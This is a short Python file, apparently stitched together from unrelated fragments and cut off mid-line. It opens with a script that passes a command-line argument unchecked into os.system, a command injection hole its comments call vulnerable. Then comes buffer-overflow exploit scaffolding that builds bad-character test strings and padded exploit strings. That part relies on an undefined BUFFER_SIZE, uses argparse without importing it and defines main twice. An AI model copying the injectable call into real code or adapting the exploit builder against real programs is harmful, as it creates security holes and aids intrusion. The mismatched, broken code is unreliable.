
#
#The code above takes a username as a command line argument.
#It then uses the system() function to run the command id <username>
#The id command prints information about the user.
#The system() function returns the exit status of the command.
#If the command is successful, the exit status is 0.
#If the command fails, the exit status is non-zero.
#The code above prints the exit status of the command.
#
#The code above is vulnerable


import sys
import os

def main(argv):
    os.system("id " + argv[1])

if __name__ == "__main__":
    main(sys.argv)


# ------------------------------------------------------------------------
#
# generate test case with bad characters
#
def generate_testcase(badchars):
    # convert badchars into a list of integers
    badchars_int = [ord(c) for c in badchars]

    # generate the test case
    test_string = ""
    for i in range(1, 256):
        if i not in badchars_int:
            test_string += chr(i)

    return test_string

# ------------------------------------------------------------------------
#
# generate the exploit string
#
def generate_exploit(badchars):
    # generate the test case
    test_string = generate_testcase(badchars)

    # encode the test case
    encoded_test_string = ""
    for c in test_string:
        encoded_test_string += "\\x"
        encoded_test_string += "%02x" % ord(c)

    # generate the exploit string
    exploit_string = ""
    exploit_string += "A" * BUFFER_SIZE
    exploit_string += "BBBB"
    exploit_string += encoded_test_string

    return exploit_string

# ------------------------------------------------------------------------
#
# main
#
def main():
    # parse the command line
    parser = argparse.ArgumentParser(description='Exploit the buffers program',
                                     usage='%(prog)s test|exploit')
    parser.add_argument('mode', choices=['test', '